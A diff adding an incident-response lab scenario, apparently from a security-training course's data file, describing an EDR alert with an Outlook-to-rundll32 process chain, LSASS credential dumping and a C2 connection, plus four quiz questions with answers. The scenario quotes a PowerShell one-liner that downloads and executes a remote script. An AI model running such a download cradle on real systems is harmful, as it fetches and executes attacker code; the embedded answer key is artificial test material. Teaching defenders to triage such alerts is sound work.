@@ -6883,6 +6883,33 @@ Required Actions:
         "Analyze command lines for suspicious indicators",
         "Check network connections and file operations",
         "Document your findings and recommend actions"
+      ],
+      labScenario: "Your EDR platform generates a critical alert on workstation WS-DEV-03: 'Suspicious Process Chain Detected.' The process tree shows: outlook.exe → cmd.exe → powershell.exe → rundll32.exe. The PowerShell command line contains: 'IEX(New-Object Net.WebClient).DownloadString(\"http://10.0.0.50:8080/payload.ps1\")'. The rundll32.exe process then loaded a DLL from 'C:\\Users\\Public\\svchost.dll' and established a connection to 45.33.32.156 on port 4443. The EDR also detected LSASS memory access by the rundll32 process, indicating credential dumping. The affected user is 'dev-admin' who has local admin privileges on 15 workstations.",
+      labQuestions: [
+        {
+          id: "8.4-q1",
+          question: "What is the parent process that started the malicious chain?",
+          answer: "outlook.exe",
+          hint: "Look at the beginning of the process tree."
+        },
+        {
+          id: "8.4-q2",
+          question: "What technique is indicated by the LSASS memory access?",
+          answer: "credential dumping",
+          hint: "LSASS stores authentication credentials in memory."
+        },
+        {
+          id: "8.4-q3",
+          question: "What port is the C2 connection established on?",
+          answer: "4443",
+          hint: "Check the outbound connection details from rundll32."
+        },
+        {
+          id: "8.4-q4",
+          question: "What internal IP is hosting the PowerShell payload?",
+          answer: "10.0.0.50",
+          hint: "Look at the DownloadString URL in the PowerShell command."
+        }
       ]
     }
   },
